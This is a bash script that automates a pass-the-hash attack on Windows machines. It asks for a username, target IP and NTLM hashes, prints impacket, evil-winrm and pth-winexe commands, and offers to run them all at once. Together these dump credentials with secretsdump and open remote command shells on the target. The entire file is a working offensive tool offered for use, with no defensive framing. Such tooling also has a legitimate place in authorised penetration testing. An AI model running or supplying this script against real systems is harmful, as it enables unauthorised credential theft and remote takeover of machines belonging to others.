#!/bin/bash

# Filename: pth_hash_attack.sh

# Colors
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RED='\033[1;31m'
NC='\033[0m'

# Banner
echo -e "${CYAN}=============================================="
echo -e "            Pass the Hash Attack"
echo -e "==============================================${NC}\n"

# Ask domain
read -p "Enter domain (leave empty if none): " domain

# Ask username
read -p "Enter username: " username

# Ask target IP
read -p "Enter target machine IP: " target_ip

# Ask for hash type
echo -e "${YELLOW}Choose hash type:${NC}"
echo "1) NT Hash only (NTHASH)"
echo "2) Full LM:NT Hash (LMHASH:NTHASH)"
read -p "Choose (1 or 2): " hash_type

if [[ "$hash_type" == "1" ]]; then
    read -p "Enter NT hash (NTHASH): " nthash
    lmhash="00000000000000000000000000000000"
    full_hash="${lmhash}:${nthash}"
elif [[ "$hash_type" == "2" ]]; then
    read -p "Enter LM hash: " lmhash
    read -p "Enter NT hash: " nthash
    full_hash="${lmhash}:${nthash}"
else
    echo -e "${RED}Invalid hash type selected.${NC}"
    exit 1
fi

# Format full target string
if [[ -n "$domain" ]]; then
    target_full="${domain}/${username}@${target_ip}"
else
    target_full="${username}@${target_ip}"
fi

# Display all generated commands
echo -e "\n${CYAN}Generated Commands:${NC}"

echo -e "${YELLOW}\nImpacket Commands:${NC}"
echo "impacket-secretsdump -hashes '${full_hash}' '${target_full}'"
echo "impacket-smbexec -hashes '${full_hash}' '${target_full}'"
echo "impacket-psexec -hashes '${full_hash}' '${target_full}'"
echo "impacket-wmiexec -hashes '${full_hash}' '${target_full}' cmd.exe"
echo "impacket-atexec -hashes '${full_hash}' '${target_full}'"

echo -e "${YELLOW}\nEvil-WinRM Command:${NC}"
echo "evil-winrm -i '${target_ip}' -u '${username}' -H '${nthash}'"

echo -e "${YELLOW}\nPTH Toolkit Command:${NC}"
echo "~/Desktop/Tool/Active_Directory/pth-toolkit/pth-winexe -U '${username}%00000000000000000000000000000000:${nthash}' //'${target_ip}' cmd.exe"

# Ping check before running
echo -e "\n${YELLOW}Pinging ${target_ip} to check connectivity...${NC}"
if ping -c 1 -W 2 "${target_ip}" > /dev/null; then
    echo -e "${CYAN}Target is reachable.${NC}"
else
    echo -e "${RED}Target is NOT reachable!${NC}"
    read -p "Do you still want to continue? (y/n): " proceed_anyway
    if [[ ! "$proceed_anyway" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}Exiting script.${NC}"
        exit 1
    fi
fi

# Ask to run impacket & evil-winrm
read -p $'\nDo you want to RUN all Impacket and Evil-WinRM commands now? (y/n): ' run_now

if [[ "$run_now" =~ ^[Yy]$ ]]; then
    echo -e "${CYAN}\nRunning Impacket & Evil-WinRM commands...${NC}"
    
    echo -e "${YELLOW}\n[*] Running: impacket-secretsdump${NC}"
    impacket-secretsdump -hashes "${full_hash}" "${target_full}"
    
    echo -e "${YELLOW}\n[*] Running: impacket-smbexec${NC}"
    impacket-smbexec -hashes "${full_hash}" "${target_full}"
    
    echo -e "${YELLOW}\n[*] Running: impacket-psexec${NC}"
    impacket-psexec -hashes "${full_hash}" "${target_full}"
    
    echo -e "${YELLOW}\n[*] Running: impacket-wmiexec${NC}"
    impacket-wmiexec -hashes "${full_hash}" "${target_full}" cmd.exe
    
    echo -e "${YELLOW}\n[*] Running: impacket-atexec${NC}"
    impacket-atexec -hashes "${full_hash}" "${target_full}"

    echo -e "${YELLOW}\n[*] Running: evil-winrm${NC}"
    evil-winrm -i "${target_ip}" -u "${username}" -H "${nthash}"
    
    echo -e "${CYAN}\nAll Impacket & Evil-WinRM commands executed.${NC}"
else
    echo -e "${YELLOW}\nExecution skipped. Commands displayed only.${NC}"
fi

echo -e "${CYAN}\nPTH-Winexe command (please run manually):${NC}"
echo "~/Desktop/Tool/Active_Directory/pth-toolkit/pth-winexe -U '${username}%00000000000000000000000000000000:${nthash}' //'${target_ip}' cmd.exe"

